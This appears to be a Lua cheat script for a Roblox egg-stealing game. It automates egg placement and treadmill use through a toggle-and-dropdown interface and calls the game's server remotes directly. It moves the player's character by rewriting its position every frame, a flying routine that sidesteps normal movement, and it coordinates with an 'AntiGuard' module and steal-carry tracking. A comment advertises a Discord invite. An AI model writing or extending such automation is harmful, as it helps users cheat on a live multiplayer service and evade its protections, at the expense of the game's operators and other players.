							if result.Unlocked == true and type(result.Requirements) == "table" and str1.Lab.BannerOk(result.BannerId) then
								for _, requirement in ipairs(result.Requirements) do
									table.insert(requirements, tostring(requirement))
								end
							end

							rift.Requirements = requirements
							rift.At = os.clock()
						end
					end

					rift.Busy = false
					tbl2.Wake()
				end)

				return false
			end)
		end

		local tbl101
		tbl101 = { "Always", "Steal Idle", "After Steal", "Night Only" }
		local tbl102
		tbl102 = { "Biggest Size", "Highest Value", "Smallest Size", "Backpack Order" }
		local flag181
		flag181 = tbl101[1]
		local flag182
		flag182 = tbl102[2]
		local tbl103
		tbl103 = {}
		local tbl104
		tbl104 = {}
		local n18
		n18 = 0

		do
			local function func145()
				if type(str1.PlaceEggRefresh) == "function" then
					str1.PlaceEggRefresh()
				end
			end

			local function func146(list16)
				local tbl105 = {}

				if type(list16) == "table" then
					for k, value130 in pairs(list16) do
						k = value130 == true and type(k) == "string" and k or type(value130) == "string" and value130 or nil

						if k then
							table.insert(tbl105, k)
						end
					end
				end

				return tbl105
			end

			str1.PlaceEggStatusRow = obj10:CreateText({ Name = "Pen Status", Text = "Pen status unknown" })

			str1.PlaceEggHandle = obj10:CreateToggle({
				Name = "Auto Place Egg",
				Default = false,
				Callback = function()
					if type(str1.PlaceEggRestart) == "function" then
						str1.PlaceEggRestart()
					end
				end,
			})

			local placeEggHandle = str1.PlaceEggHandle

			obj10:CreateDropdown({
				Name = "Place Egg Rule",
				Options = tbl101,
				Default = tbl101[1],
				SubOf = placeEggHandle,
				Callback = function(value)
					if table.find(tbl101, value) then
						flag181 = value
					end
				end,
			})

			obj10:CreateDropdown({
				Name = "Place Egg Order",
				Options = tbl102,
				Default = tbl102[2],
				SubOf = placeEggHandle,
				Callback = function(value)
					if table.find(tbl102, value) then
						flag182 = value
					end
				end,
			})

			local tbl106 = {}

			for i = 2, #list3 do
				table.insert(tbl106, list3[i])
			end

			if #tbl106 > 0 then
				func6(obj10:CreateMultiDropdown({
					Name = "Place Rarities",
					Note = "Only place eggs of the picked rarities (empty = all)",
					Options = tbl106,
					Default = {},
					SubOf = placeEggHandle,
					Callback = function(value)
						local tbl107 = {}

						for _, item48 in ipairs(func146(value)) do
							local entry7 = tbl8[item48]

							if entry7 and entry7 > 0 then
								tbl107[entry7] = true
							end
						end

						tbl103 = tbl107
						func145()
					end,
				}))
			end

			local tbl108 = {}
			local tbl109 = {}
			local directory = tbl1.Assets and tbl1.Assets.Directory
			local tbl110 = {}

			if type(directory) == "table" then
				for k, value131 in pairs(directory) do
					local rarity = type(value131) == "table" and value131.Rarity or nil
					local flag183 = type(rarity) == "table"

					if flag183 then
						flag183 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag183 = flag183 or nil

					if flag183 then
						table.insert(tbl110, {
							Category = tostring(k),
							Name = tostring(value131.DisplayName or k),
							Rarity = flag183,
							RarityName = tostring(rarity.DisplayName or rarity._id or flag183),
						})
					end
				end
			end

			table.sort(tbl110, function(param103, param104)
				if param103.Rarity ~= param104.Rarity then
					return param103.Rarity > param104.Rarity
				end
				return param103.Name < param104.Name
			end)

			for _, item49 in ipairs(tbl110) do
				local formatted3 = string.format("%s [%s]", item49.Name, item49.RarityName)

				if tbl109[formatted3] then
					formatted3 = string.format("%s [%s] (%s)", item49.Name, item49.RarityName, item49.Category)
				end

				table.insert(tbl108, formatted3)
				tbl109[formatted3] = item49.Category
			end

			if #tbl108 > 0 then
				func6(obj10:CreateMultiDropdown({
					Name = "Place Specific Eggs",
					Note = "Only place these eggs (empty = all)",
					Options = tbl108,
					Default = {},
					SubOf = placeEggHandle,
					Callback = function(value)
						local tbl111 = {}

						for _, item50 in ipairs(func146(value)) do
							if tbl109[item50] then
								tbl111[tbl109[item50]] = true
							end
						end

						tbl104 = tbl111
						func145()
					end,
				}))
			end

			local tbl112 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local n19 = 0
			local str12 = "M/s"

			local function func147(flag184, flag185)
				if flag184 ~= nil then
					n19 = math.max(0, math.floor(tonumber(flag184) or n19))
				end

				if flag185 ~= nil then
					str12 = tostring(flag185)
				end

				n18 = n19 * (tbl112[str12] or tbl112["M/s"]).Mult
			end

			func5(obj10, {
				Name = "Min Place Value",
				Note = "Skip eggs worth less than this (0 = off)",
				SubOf = placeEggHandle,
				Legacy = "Place Min Value",
				SectionName = "Auto Place Egg",
				OnRaw = function(num72)
					func147(math.floor(num72 / 1000), "K/s")
				end,
			})
		end

		do
			local n19 = 5
			local n20 = 26
			local n21 = 6
			local n22 = 8
			local n23 = 0
			local n24 = 30
			local n25 = 12
			local placeEggHandle = nil
			local placeEggStatusRow = nil
			local str13 = "Pen status unknown"
			local flag186 = false
			local tbl113 = {}
			local n26 = 0
			local value132 = nil
			local n27 = 30

			local function func148(childName5, param105)
				local obj31 = networking:FindFirstChild(childName5)
				if not obj31 or not obj31:IsA("RemoteFunction") then
					return false, nil
				end
				return pcall(obj31.InvokeServer, obj31, param105)
			end

			local function func149(param106)
				local directory = tbl1.Assets and tbl1.Assets.Directory
				local flag187 = type(directory) == "table" and directory[tostring(param106.AssetCategory)] or nil
				return type(flag187) == "table" and flag187 or nil
			end

			local function func150(param107)
				local rarity = func149(param107)
				rarity = rarity and rarity.Rarity or nil
				local flag188 = type(rarity) == "table"
				local flag189

				if flag188 then
					flag189 = tonumber(rarity.RarityNumber or rarity.Rank)
				else
					flag189 = flag188
				end

				return flag189 or 0
			end

			local function func151(param108)
				local n28 = func149(param108)
				n28 = n28 and tonumber(n28.EarningRate) or 0
				local n29 = tonumber(param108.AssetScale) or 0
				if n29 <= 0 then
					return 0
				end
				local n30 = n29 > 5 and (n29 / 5) ^ 1.2 * 19.637875755794113 or n29 ^ 1.85
				local mutations = tbl1.Mutations
				local flag190 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n31 = 1

				if flag190 then
					local ok
					ok, n31 = pcall(mutations.EarningsFor, type(param108.Mutations) == "table" and param108.Mutations or {})
					ok = ok and type(n31) == "number"
					local n32 = 1

					if not ok then
						n31 = n32
					end
				end

				return n28 * n30 * n31
			end

			local function func152()
				local tbl114 = {}
				local backpack = localPlayer:FindFirstChildOfClass("Backpack")
				if not backpack then
					return tbl114
				end
				local n28 = 0

				for _, child in ipairs(backpack:GetChildren()) do
					local attribute = child:GetAttribute("UID")

					if type(attribute) == "string" then
						n28 += 1
						tbl114[attribute] = n28
					end
				end

				return tbl114
			end

			local function func153()
				local eggState = tbl1.EggState
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return {}
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return {}
				end
				local result28 = func152()
				local tbl115 = str1.Lab.StockTargets()
				local tbl116 = {}

				if str1.RiftOn("Place") then
					tbl116 = str1.RiftShortfall()

					for _, value133 in pairs(result) do
						if type(value133) == "table" and value133.Placement ~= nil then
							local assetCategory5 = tostring(value133.AssetCategory)

							if (tbl116[assetCategory5] or 0) > 0 then
								tbl116[assetCategory5] = tbl116[assetCategory5] - 1
							end
						end
					end
				end

				local tbl117 = {}

				for k, value134 in pairs(result) do
					if type(value134) == "table" and value134.Placement == nil and not tbl113[k] and not str1.Lab.Reserved[k] then
						local assetCategory6 = tostring(value134.AssetCategory)

						if (tbl115[assetCategory6] or 0) > 0 then
							tbl115[assetCategory6] = tbl115[assetCategory6] - 1
						else
							local value135 = func151(value134)
							local assetCategory7 = tostring(value134.AssetCategory)
							local flag191 = next(tbl103) == nil or tbl103[func150(value134)] == true
							local flag192 = next(tbl104) == nil or tbl104[assetCategory7] == true
							local flag193 = n18 <= 0 or value135 >= n18
							local flag194 = (tbl116[assetCategory7] or 0) > 0

							if flag194 then
								tbl116[assetCategory7] = tbl116[assetCategory7] - 1
							end

							if str1.Lab.PlaceOn and str1.Lab.IsLabPet(assetCategory7) then
								flag194 = true
							end

							flag193 = str1.Toggle(str1.PlaceEggHandle, false) == true and flag191 and flag192 and flag193

							if flag194 or flag193 then
								table.insert(tbl117, {
									Uid = k,
									Scale = tonumber(value134.AssetScale) or 0,
									Income = value135,
									Slot = result28[k] or math.huge,
									Rift = flag194,
								})
							end
						end
					end
				end

				table.sort(tbl117, function(param109, param110)
					if param109.Rift ~= param110.Rift then
						return param109.Rift
					end

					if flag182 == tbl102[2] and param109.Income ~= param110.Income then
						return param109.Income > param110.Income
					end

					if flag182 == tbl102[3] and param109.Scale ~= param110.Scale then
						return param109.Scale < param110.Scale
					end

					if flag182 == tbl102[4] and param109.Slot ~= param110.Slot then
						return param109.Slot < param110.Slot
					end
					return param109.Scale > param110.Scale
				end)

				return tbl117
			end

			local function func154(flag195)
				if flag195 == 0 then
					return false
				end

				if not str1.Toggle(placeEggHandle, false) then
					return true
				end
				local steal = str1.Steal
				if flag181 == tbl101[2] then
					return not steal.Active and not steal.Carrying
				end

				if flag181 == tbl101[3] then
					local flag196 = steal.LastFinishedAt > 0
					local flag197

					if flag196 then
						local lastFinishedAt = steal.LastFinishedAt
						flag197 = os.clock() - lastFinishedAt <= n25
					else
						flag197 = flag196
					end

					return flag197
				end

				if flag181 == tbl101[4] then
					return str1.IsNight()
				end
				return true
			end

			local function func155()
				local eggState = tbl1.EggState
				local flag198 = type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function"
				local n28 = 0

				if flag198 then
					local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)

					if ok and type(result) == "table" then
						for _, value136 in pairs(result) do
							if type(value136) == "table" and value136.Placement ~= nil then
								n28 += 1
							end
						end
					end
				end

				local save2 = tbl1.Save
				local flag199 = type(save2) == "table" and type(save2.Get) == "function"
				local result = nil

				if flag199 then
					local ok
					ok, result = pcall(save2.Get)
					result = ok and type(result) == "table" and result or nil
				end

				local flag200 = result and type(result.EquippedAssets) == "table"
				local n29 = 0

				if flag200 then
					for k in pairs(result.EquippedAssets) do
						n29 += 1
					end
				end

				local value137 = func2(function()
					return ReplicatedStorage.Data.Bases
				end)

				local flag201 = type(value137) == "table" and type(value137.GetAssetEquipCapacity) == "function"
				local ok = nil

				if flag201 then
					local result2
					ok, result2 = pcall(value137.GetAssetEquipCapacity, result and tonumber(result.BaseUpgradeLevel) or 0)
					ok = ok and tonumber(result2) or nil
				end

				if not ok then
					local rfPenRosterAskWearLimit = networking:FindFirstChild("RF/PenRoster/AskWearLimit")

					if rfPenRosterAskWearLimit and rfPenRosterAskWearLimit:IsA("RemoteFunction") then
						local ok2, result2 = pcall(rfPenRosterAskWearLimit.InvokeServer, rfPenRosterAskWearLimit)
						ok = ok2 and tonumber(result2) or nil
					end
				end

				ok = ok or 0
				return ok - n28 - n29, ok, n28, n29
			end

			local n28 = -0.5
			local n29 = -24

			local function func156()
				local eggState = tbl1.EggState
				local tbl118 = {}
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return tbl118
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return tbl118
				end

				for _, value138 in pairs(result) do
					local placement = type(value138) == "table" and value138.Placement or nil
					local localCFrame = type(placement) == "table" and placement.LocalCFrame or nil

					if typeof(localCFrame) == "CFrame" then
						table.insert(tbl118, Vector2.new(localCFrame.Position.X, localCFrame.Position.Z))
					end
				end

				return tbl118
			end

			local obj32 = Random.new()

			local function func157(list17)
				local tbl119 = {}

				for i = n29, 8, 4 do
					for i2 = 4, 30, 4 do
						local vector2 = Vector2.new(i, i2)
						local flag202 = true

						for _, item51 in ipairs(list17) do
							if (item51 - vector2).Magnitude < n19 then
								flag202 = false
								break
							end
						end

						if flag202 then
							table.insert(tbl119, CFrame.new(i, n28, i2))
						end
					end
				end

				for i = #tbl119, 2, -1 do
					local value139 = obj32:NextInteger(1, i)
					local entry8 = tbl119[i]
					tbl119[i] = tbl119[value139]
					tbl119[value139] = entry8
				end
				-- join us: https://discord.gg/x7YbZeezpm

				return tbl119
			end

			local function func158()
				local value140, value141, value142, value143 = func155()
				local eggState = tbl1.EggState
				local flag203 = type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function"
				local n30 = 0

				if flag203 then
					local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)

					if ok and type(result) == "table" then
						for _, value144 in pairs(result) do
							if type(value144) == "table" and value144.Placement == nil then
								n30 += 1
							end
						end
					end
				end

				str13 = string.format("Eggs placed %d/%d  -  %d/%d pets equipped, %d in bag", value142, 30, value143, value141, n30)
				return value140, value142
			end

			local function func159(num73, callback6)
				local flag204 = str1.Root()
				if not flag204 then
					return false
				end
				local position = flag204.Position
				local n30 = (num73 - position).Magnitude / math.max(400, 1) + 3
				local value145 = nil
				local n31 = 0

				local connection2 = RunService.Heartbeat:Connect(function(deltaTime)
					if value145 ~= nil or str1.AntiGuard.Busy then
						return
					end
					n31 += deltaTime
					local flag205 = str1.Root()
					if not flag205 or callback6() or n31 > n30 then
						value145 = false
						return
					end

					if (flag205.Position - position).Magnitude > 6 then
						position = flag205.Position
					end

					local n32 = num73 - position
					local n33 = n8 * deltaTime
					local flag206 = n32.Magnitude <= math.max(n33, 0.05)
					position = flag206 and num73 or position + n32.Unit * n33
					local vector = Vector3.new(n32.X, 0, n32.Z)
					local cframe = vector.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector.Unit) or flag205.CFrame.Rotation

					pcall(function()
						flag205.CFrame = CFrame.new(position) * cframe
						flag205.AssemblyLinearVelocity = Vector3.zero
						flag205.AssemblyAngularVelocity = Vector3.zero
					end)

					if flag206 then
						value145 = true
					end
				end)

				while value145 == nil do
					RunService.Heartbeat:Wait()
				end

				connection2:Disconnect()
				return value145
			end

			local function func160()
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				world = world and world:FindFirstChild("SeparationLine")
				return world and world:IsA("BasePart") and world.Position.X or 552
			end

			local value146 = nil

			local function func161(num74)
				local flag207 = str1.Root()
				if not flag207 or type(str1.StealHome) ~= "function" then
					return nil
				end
				local result29 = func160()
				if flag207.Position.X < result29 == num74.X < result29 then
					return nil
				end
				local ok, result = pcall(str1.StealHome)
				if not ok or typeof(result) ~= "Vector3" then
					return nil
				end

				if (result - num74).Magnitude <= 12 or (flag207.Position - result).Magnitude <= 12 then
					return nil
				end
				return result
			end

			value146 = function(num75, callback7, flag208, flag209)
				local flag210 = str1.Root()
				if not flag210 then
					return false
				end

				if not flag209 then
					local flag211 = func161(num75)
					if flag211 and not value146(flag211, callback7, flag208, true) then
						return false
					end

					if callback7 and callback7() then
						return false
					end
					flag210 = str1.Root()
					if not flag210 then
						return false
					end
				end

				str1.Shield(flag208 or "place", true)
				str1.Driving = str1.Driving + 1
				task.wait(0.2)
				local n30 = num75 + Vector3.new(0, 3, 0)
				local n31 = math.max(flag210.Position.Y, n30.Y) + n27

				local ok, result = pcall(function()
					return func159(Vector3.new(flag210.Position.X, n31, flag210.Position.Z), callback7) and func159(Vector3.new(n30.X, n31, n30.Z), callback7) and func159(n30, callback7)
				end)

				ok = ok and result == true
				str1.Driving = math.max(0, str1.Driving - 1)
				str1.Shield(flag208 or "place", false)
				return ok
			end

			str1.FlyTo = function(param111, param112, flag212)
				return value146(param111, param112, flag212 or "fly")
			end

			local function func162()
				local eggState = tbl1.EggState
				if type(eggState) ~= "table" or type(eggState.PlantEgg) ~= "function" then
					return false
				end
				local result30 = func153()
				if not func154(#result30) then
					return false
				end
				func158()
				local value147, value148, value149 = func155()
				local n30 = n24 - (tonumber(value149) or 0)
				if n30 <= 0 then
					return false
				end
				local penAnch = str1.PenAnchor()
				if not penAnch then
					return false
				end
				str1.Movement.PlaceWanted = true
				if not str1.ClaimMovement("place") then
					return "waiting"
				end
				local flag213 = n26

				local function func163()
					local flag214 = str1.Toggle(placeEggHandle, false) == true
					local flag215 = flag213 ~= n26

					if not flag215 then
						flag215 = not (flag214 or str1.Lab.PlaceOn)
					end

					if flag215 then
						return true
					end

					if str1.IsNight() then
						return false
					end
					return flag214 and flag181 == tbl101[4] or str1.Movement.StealFirst
				end

				if str1.Treadmill.Riding or str1.OnBelt() then
					str1.ExitBelt()
				end

				local function func164()
					str1.HoldBelt()
					local ok, result = pcall(value146, penAnch, func163)
					str1.ReleaseBelt()
					return ok and result and true or false
				end

				if str1.DistanceTo(penAnch) > n20 then
					str13 = "Flying to the pen"

					if not func164() then
						str1.LeaveBelt()
						n23 = os.clock() + n21
						return false
					end
				end

				str1.LeaveBelt()
				if func163() then
					return false
				end

				local function func165()
					if str1.DistanceTo(penAnch) <= n20 then
						return true
					end

					if func163() then
						return false
					end
					str13 = "Pen out of reach, flying back"
					return func164() and str1.DistanceTo(penAnch) <= n20
				end

				if not func165() then
					str13 = "Could not reach the pen, trying again soon"
					n23 = os.clock() + n21
					return false
				end

				local result31 = func156()
				local n31 = 0
				local n32 = 0

				for _, item52 in ipairs(result30) do
					if not (n31 >= n30 or func163()) then
						if not func165() then
							str13 = "Pen out of reach, stopping this pass"
							break
						else
							local ok, result = pcall(eggState.WearEggTool, item52.Uid)

							if ok and result ~= false then
								task.wait(0.15)
								local n33 = 0
								local flag216 = false

								for _, item53 in ipairs(func157(result31)) do
									if not (func163() or n33 >= n22) then
										n33 += 1
										local AskPlaceEgg, flag217 = func148("RF/EggWorld/AskPlaceEgg", { Uid = item52.Uid, LocalCFrame = item53 })

										if AskPlaceEgg and flag217 ~= false then
											table.insert(result31, Vector2.new(item53.Position.X, item53.Position.Z))
											n31 += 1
											flag216 = true
											break
										else
											continue
										end
									end

									break
								end

								if flag216 then
									n32 = 0
									continue
								else
									tbl113[item52.Uid] = true
									n32 += 1
									if not (n32 >= 2) then
										continue
									end
								end
							else
								tbl113[item52.Uid] = true
								continue
							end
						end
					end

					break
				end

				if type(eggState.DoffEggTool) == "function" then
					pcall(eggState.DoffEggTool)
				end

				if n31 == 0 then
					n23 = os.clock() + n21
				end

				return n31 > 0
			end

			tbl2.Add(function()
				local value150, value151 = func158()

				if placeEggStatusRow and type(placeEggStatusRow.Set) == "function" then
					pcall(placeEggStatusRow.Set, placeEggStatusRow, str13)
				end

				local num76 = tonumber(value151)
				local flag218 = num76 ~= nil and value132 ~= nil and num76 < value132

				if num76 then
					value132 = num76
				end

				if flag218 then
					table.clear(tbl113)
				end

				if not str1.Toggle(placeEggHandle, false) and not str1.Lab.PlaceOn then
					str1.Movement.PlaceWanted = false
					str1.ReleaseMovement("place")
					return false
				end

				if flag186 then
					return false
				end

				if os.clock() < n23 then
					str1.Movement.PlaceWanted = false
					return false
				end

				if str1.Movement.StealFirst and not str1.IsNight() then
					str1.Movement.PlaceWanted = false
					return false
				end

				if type(str1.MechFirst) == "function" and str1.MechFirst() then
					str1.Movement.PlaceWanted = false
					return false
				end
				flag186 = true

				task.spawn(function()
					local ok, result = pcall(func162)

					if not (ok and result == "waiting") then
						str1.Movement.PlaceWanted = false
					end

					str1.ReleaseMovement("place")
					flag186 = false
					tbl2.Wake()
				end)

				return false
			end)

			placeEggHandle = str1.PlaceEggHandle
			placeEggStatusRow = str1.PlaceEggStatusRow

			str1.PlaceEggRestart = function()
				table.clear(tbl113)
				n26 += 1
				str1.StopWalking()
				tbl2.Wake()
			end

			str1.PlaceEggRefresh = function()
				table.clear(tbl113)
				tbl2.Wake()
			end

			str1.Rift.Restart.Place = function()
				table.clear(tbl113)
				tbl2.Wake()
			end
		end

		local save2 = tbl1.Save

		if type(save2) == "table" and type(save2.FieldSignal) == "function" then
			for _, item54 in ipairs({ "EggInventory", "EquippedAssets", "BaseUpgradeLevel" }) do
				local ok, result = pcall(save2.FieldSignal, item54)

				if ok and type(result) == "table" and type(result.Connect) == "function" then
					local ok2, result2 = pcall(result.Connect, result, function()
						tbl2.Wake()
					end)

					if ok2 and result2 then
						func4(function()
							pcall(function()
								result2:Disconnect()
							end)
						end)
					end
				end
			end
		end

		str1.Steal.HeldByMe = function()
			local carryUid = str1.Steal.CarryUid
			local character = localPlayer.Character
			if type(carryUid) ~= "string" or not character then
				return false
			end
			local obj33 = workspace:FindFirstChild(carryUid)
			if not obj33 then
				return false
			end

			for _, descendant in ipairs(obj33:GetDescendants()) do
				if descendant:IsA("WeldConstraint") or descendant:IsA("JointInstance") then
					local ok, result, result2 = pcall(function()
						return descendant.Part0, descendant.Part1
					end)

					local value152

					if ok then
						value152 = result and result:IsDescendantOf(character) or result2 and result2:IsDescendantOf(character)
					else
						value152 = ok
					end

					if value152 then
						return true
					end
				end
			end

			return false
		end

		do
			local n19 = 0

			local connection2 = RunService.Heartbeat:Connect(function(deltaTime)
				n19 += deltaTime
				if n19 < 0.2 then
					return
				end
				n19 = 0
				local steal = str1.Steal

				if not steal.Carrying then
					if steal.GuessedDrop then
						local ok, result = pcall(steal.HeldByMe)

						if ok and result then
							steal.GuessedDrop = false
							steal.Carrying = true
							steal.HeldSeenAt = os.clock()
						end
					end

					return
				end

				local ok, result = pcall(steal.HeldByMe)
				if not ok or result then
					steal.HeldSeenAt = os.clock()
					return
				end

				if os.clock() - (steal.HeldSeenAt or 0) > 0.8 then
					steal.Carrying = false
					steal.GuessedDrop = true
					steal.LastFinishedAt = os.clock()
					tbl2.Wake()
				end
			end)

			func4(function()
				pcall(function()
					connection2:Disconnect()
				end)
			end)
		end

		do
			local eggState = tbl1.EggState
			local carryChanged = type(eggState) == "table" and eggState.CarryChanged or nil

			if type(carryChanged) == "table" and type(carryChanged.Connect) == "function" then
				local ok, result = pcall(carryChanged.Connect, carryChanged, function(param113)
					local carrying = type(param113) == "table" and param113.IsCarrying == true

					if str1.Steal.Carrying and not carrying then
						str1.Steal.LastFinishedAt = os.clock()
					end

					str1.Steal.GuessedDrop = false

					if carrying then
						str1.Steal.HeldSeenAt = os.clock()
					end

					if carrying and type(param113.Uid) == "string" then
						str1.Steal.CarryUid = param113.Uid
						str1.Steal.CarryAreaId = param113.AreaId
						local mult = tonumber(param113.SpeedMultiplier)

						if mult and mult > 0 then
							str1.SafeCarry.Mult = mult
							str1.SafeCarry.Category = param113.AssetCategory

							if param113.AssetCategory ~= nil then
								local assetCategory8 = tostring(param113.AssetCategory)
								str1.SafeCarry.Seen[assetCategory8] = math.min(str1.SafeCarry.Seen[assetCategory8] or mult, mult)
							end
						end
					end

					str1.Steal.Carrying = carrying
					tbl2.Wake()
				end)

				if ok and result then
					func4(function()
						pcall(function()
							result:Disconnect()
						end)
					end)
				end
			end
		end

		pcall(function()
			local reEggWorldFieldEggRedeemVerdict = networking:FindFirstChild("RE/EggWorld/FieldEggRedeemVerdict")
			local reAlertsRaise = networking:FindFirstChild("RE/Alerts/Raise")

			if reEggWorldFieldEggRedeemVerdict and reEggWorldFieldEggRedeemVerdict:IsA("RemoteEvent") then
				local connection2 = reEggWorldFieldEggRedeemVerdict.OnClientEvent:Connect(function()
					str1.SafeCarry.LastDelivered = os.clock()
				end)

				func4(function()
					connection2:Disconnect()
				end)
			end

			if reAlertsRaise and reAlertsRaise:IsA("RemoteEvent") then
				local connection2 = reAlertsRaise.OnClientEvent:Connect(function(param114)
					if type(param114) == "table" and type(param114.Text) == "string" and string.find(param114.Text, "Delivery failed", 1, true) then
						str1.SafeCarry.LastFailed = os.clock()
					end
				end)

				func4(function()
					connection2:Disconnect()
				end)
			end
		end)

		do
			local n19 = 10
			local n20 = 1
			local n21 = 5

			local function func166(childName6)
				local obj34 = networking:FindFirstChild(childName6)
				if not obj34 or not obj34:IsA("RemoteFunction") then
					return false, nil, nil
				end
				local ok, result, result2 = pcall(obj34.InvokeServer, obj34)
				return ok, result, result2
			end

			local n22 = 0
			local flag219 = false

			local function func167(flag220, flag221, param115)
				if flag220 and flag221 ~= false then
					n22 = 0
					flag219 = false
					return true
				end

				if flag220 and tostring(param115) == "Already using treadmill" then
					n22 = 0
					flag219 = false
					return true
				end

				if flag220 and tostring(param115) == "Not grounded" and str1.Grounded() then
					n22 += 1

					if n22 >= 2 then
						n22 = 0

						if not flag219 then
							flag219 = true
							pcall(str1.UndoSwap)
						elseif type(str1.RequestRespawn) == "function" then
							flag219 = false
							str1.RequestRespawn()
						end
					end
				end

				return false
			end

			local value153 = nil
			local value154 = nil
			local flag222 = false
			local n23 = 0
			local flag223 = false
			local treadmill = str1.Treadmill

			local function func168()
				return str1.Toggle(value153, false)
			end

			local function func169()
				local movement = str1.Movement
				return movement.PlaceWanted or movement.ScrambleWanted or movement.MutationWanted or movement.FracturedWanted or movement.Owner ~= nil and movement.Owner ~= "treadmill" or str1.Steal.Active or str1.Steal.Carrying
			end

			local function func170()
				local flag224 = n23
				if func169() or not str1.ClaimMovement("treadmill") then
					return false
				end

				local function func171()
					return flag224 ~= n23 or not func168() or str1.Movement.Owner ~= "treadmill" or func169()
				end

				if str1.BeltHeld() then
					str1.ResetBelt()
				end

				local flag225 = str1.Belt()
				if not flag225 then
					return false
				end
				local n24 = flag225.Position + Vector3.new(0, flag225.Size.Y / 2, 0)

				if n19 < str1.DistanceTo(n24 + Vector3.new(0, 2, 0)) then
					if type(str1.FlyTo) ~= "function" or not str1.FlyTo(n24, func171, "treadmill") then
						return false
					end
				end

				if func171() then
					return false
				end
				treadmill.Riding = func167(func166("RF/Treadmill/AskWearStill"))
				return treadmill.Riding
			end

			tbl2.Add(function()
				if not func168() then
					if treadmill.Riding and not flag222 then
						flag222 = true

						task.spawn(function()
							pcall(str1.ExitBelt)
							flag222 = false
							tbl2.Wake()
						end)
					end

					return false
				end

				if flag222 or func169() then
					return false
				end

				if treadmill.Riding and str1.Toggle(value154, true) and str1.OnBelt() then
					if os.clock() >= (treadmill.NextCheck or 0) and not str1.Flying and str1.Grounded() then
						treadmill.NextCheck = os.clock() + n21
						flag222 = true

						task.spawn(function()
							local ok, result = pcall(function()
								return func167(func166("RF/Treadmill/AskWearStill"))
							end)

							treadmill.Riding = ok and result == true

							if not treadmill.Riding then
								treadmill.NextTry = 0
							end

							flag222 = false
							tbl2.Wake()
						end)
					end

					return false
				end

				if os.clock() < (treadmill.NextTry or 0) then
					return false
				end
				treadmill.NextCheck = 0
				treadmill.NextTry = os.clock() + (treadmill.LastFailed and 3 or 4)
				flag222 = true

				task.spawn(function()
					local ok, result = pcall(func170)
					treadmill.LastFailed = not (ok and result == true)
					str1.ReleaseMovement("treadmill")
					flag222 = false
					tbl2.Wake()
				end)

				return false
			end)

			task.spawn(function()
				while not flag223 do
					task.wait(3)

					if not func168() and not func169() and not str1.Flying and str1.OnBelt() and str1.Grounded() then
						func167(func166("RF/Treadmill/AskWearStill"))
					end
				end
			end)

			task.spawn(function()
				local n24 = 0

				while not flag223 do
					local value155 = task.wait(0.25)

					if not func168() or not treadmill.Riding or func169() then
						n24 = 0
					elseif str1.OnBelt() then
						n24 = 0
					else
						n24 += value155

						if n24 >= 1.5 then
							treadmill.Riding = false
							treadmill.NextTry = 0
							tbl2.Wake()
							n24 = 0
						end
					end
				end
			end)

			task.spawn(function()
				local n24 = 0
				local n25 = 0
				local position = nil

				while not flag223 do
					local num77 = task.wait(0.25)
					n24 = math.max(0, n24 - num77)
					local riding = treadmill.Riding and func168() and not func169()
					local flag226 = str1.Root()
					local character = localPlayer.Character
					character = character and character:FindFirstChildOfClass("Humanoid")

					if riding or not (str1.Flying or str1.Movement.Owner ~= nil or str1.Movement.PlaceWanted or character ~= nil and character.MoveDirection.Magnitude > 0.1) or not flag226 or not str1.OnBelt() then
						position = flag226 and flag226.Position
						n25 = 0
						position = position or nil
					else
						local vector = Vector3.new(flag226.Position.X, 0, flag226.Position.Z)
						position = position and (vector - Vector3.new(position.X, 0, position.Z)).Magnitude < 0.5

						if position then
							n25 += num77
						else
							n25 = 0
						end

						position = flag226.Position

						if n25 >= n20 and n24 <= 0 then
							pcall(str1.ExitBelt)
							n24 = 1.5
							n25 = 0
						end
					end
				end
			end)

			func4(function()
				flag223 = true
				treadmill.Riding = false
			end)

			value153 = obj11:CreateToggle({
				Name = "Auto Treadmill",
				Default = false,
				Callback = function()
					n23 += 1
					str1.StopWalking()
					tbl2.Wake()
				end,
			})

			value154 = obj11:CreateToggle({ Name = "Stay On Treadmill", Default = true })
		end

		do
			local n19 = 4
			local n20 = 10
			local value156 = nil
			local flag227 = false
			local n21 = 0
			local tbl120 = {}
			local tbl121 = { MinRarity = 0, MinIncome = 0, Eggs = {} }

			local function func172(childName7, param116)
				local obj35 = networking:FindFirstChild(childName7)
				if not obj35 or not obj35:IsA("RemoteFunction") then
					return false, nil
				end
				return pcall(obj35.InvokeServer, obj35, param116)
			end

			local function func173(param117)
				local flag228 = tbl121.MinRarity > 0
				local flag229

				if flag228 then
					local minRarity = tbl121.MinRarity
					flag229 = str1.EggRarity(param117) < minRarity
				else
					flag229 = flag228
				end

				if flag229 then
					return false
				end
				local flag230 = tbl121.MinIncome > 0

				if flag230 then
					local minIncome = tbl121.MinIncome
					flag230 = str1.EggIncome(param117) < minIncome
				end

				if flag230 then
					return false
				end

				if next(tbl121.Eggs) ~= nil and tbl121.Eggs[tostring(param117.AssetCategory)] ~= true then
					return false
				end
				return true
			end

			local function func174()
				local eggState = tbl1.EggState
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return {}
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return {}
				end
				local flag231 = str1.Toggle(value156, false) == true
				local Hatch = str1.RiftOn("Hatch") and str1.RiftShortfall() or {}
				local tbl122 = {}
				local tbl123 = {}

				for k, value157 in pairs(result) do
